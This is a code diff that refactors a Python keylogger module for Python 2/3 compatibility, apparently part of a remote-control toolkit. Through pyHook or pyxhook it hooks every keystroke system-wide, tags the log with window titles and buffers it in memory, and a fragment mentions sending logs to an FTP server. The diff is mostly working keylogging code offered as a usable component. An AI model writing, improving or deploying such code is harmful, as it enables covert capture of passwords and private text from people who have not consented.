@@ -12,12 +12,17 @@ import StringIO
 import threading
 import collections
 
+try:
+    from io import StringIO        # Python 3
+except ImportError:
+    from StringIO import StringIO  # Python 2
+
 # packages
 if sys.platform == 'win32':
-    import pyHook
+    import pyHook as hook_manager
     import pythoncom
 else:
-    import pyxhook
+    import pyxhook as hook_manager
 
 # utilities
 import util
@@ -29,7 +34,7 @@ packages = ['util','pyHook','pythoncom'] if os.name == 'nt' else ['util','pyxhoo
 platforms = ['win32','linux2','darwin']
 window = None
 max_size = 4000
-logs = StringIO.StringIO()
+logs = StringIO()
 threads = {}
 results = {}
 usage = 'keylogger <run/status/stop>'
@@ -41,19 +46,20 @@ or an FTP server
 
 # main
 def _event(event):
+    global window
     try:
-        if event.WindowName != globals()['window']:
-            globals()['window'] = event.WindowName
-            globals()['logs'].write("\n[{}]\n".format(window))
+        if event.WindowName != window:
+            window = event.WindowName
+            logs.write("\n[{}]\n".format(window))
         if event.Ascii > 32 and event.Ascii < 127:
-            globals()['logs'].write(chr(event.Ascii))
+            logs.write(chr(event.Ascii))
         elif event.Ascii == 32:
-            globals()['logs'].write(' ')
+            logs.write(' ')
         elif event.Ascii in (10,13):
-            globals()['logs'].write('\n')
+            logs.write('\n')
         elif event.Ascii == 8:
-            globals()['logs'].seek(-1, 1)
-            globals()['logs'].truncate()
+            logs.seek(-1, 1)
+            logs.truncate()
         else:
             pass
     except Exception as e:
@@ -61,12 +67,13 @@ def _event(event):
     return True
 
 def _run():
+    global abort
     while True:
-        hm = pyHook.HookManager() if os.name == 'nt' else pyxhook.HookManager()
+        hm = hook_manager.HookManager()
         hm.KeyDown = _event
         hm.HookKeyboard()
         pythoncom.PumpMessages() if os.name == 'nt' else time.sleep(0.1)
-        if globals()['abort']: 
+        if abort: 
             break
 
 def run():
@@ -74,9 +81,10 @@ def run():
     Run the keylogger
 
     """
+    global threads
     try:
-        if 'keylogger' not in globals()['threads'] or not globals()['threads']['keylogger'].is_alive():
-            globals()['threads']['keylogger'] = threading.Thread(target=_run, name=time.time())
-        return globals()['threads']['keylogger']
+        if 'keylogger' not in threads or not threads['keylogger'].is_alive():
+            threads['keylogger'] = threading.Thread(target=_run, name=time.time())
+        return threads['keylogger']
     except Exception as e:
         util.log(str(e))
